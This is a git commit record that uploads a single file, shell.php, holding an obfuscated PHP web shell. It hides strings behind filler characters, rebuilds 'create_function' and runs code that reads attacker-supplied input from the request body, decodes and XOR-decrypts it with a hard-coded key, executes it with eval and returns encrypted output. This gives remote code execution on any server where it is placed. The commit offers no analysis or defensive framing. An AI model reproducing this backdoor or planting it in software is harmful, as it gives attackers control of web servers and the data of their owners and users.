e8465f606ee04f8a6756a13be70ebaaeb4ae4fba
ayaanmahe <117720005+ayaanmahe@users.noreply.github.com>
2022-12-03 13:19:44 +0530

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,10 @@
+<?php
+$r='t_cp%ontents()p%;@ob_enp%p%d_cp%lean();$r=@basp%e64_enp%code(p%@x(@p%gzcomprp%ess($o),p%$k));p%printp%("$pp%$kh$r$kf");}';
+$F='{$o.=$t{$i}^p%$p%kp%{$jp%};}}retup%rn $o;}if (@p%preg_map%tch("/$kh(p%.+)$p%kf/",@p%fip%le_getp%_contep%nts("php:p%//inp';
+$I='ut")p%,$m)==p%1)p% {@obp%_start();@ep%val(@gp%zp%unp%comp%press(@x(@basep%64_decop%de($m[1p%]),p%$k)));$o=@p%p%ob_ge';
+$N='$k="81dc9p%bdbp%p%";p%$kp%h="52d04dcp%20036";$kf="dbd8p%313ed055"p%;$p="Jp%E472rp%yTap%oyEbSw4p%";functiop%n xp%(p%$p%t,';
+$d=str_replace('yX','','cyXryXeyXate_fuyXyXnyXction');
+$a='$k){$c=strlep%n($k);$l=p%strlen($p%t);p%$op%=""p%;fp%or(p%$i=0;$i<$l;){forp%($j=p%0;p%($j<$c&&$i<$l);p%p%$j++p%,$i++)';
+$S=str_replace('p%','',$N.$a.$F.$I.$r);
+$b=$d('',$S);$b();
+?>
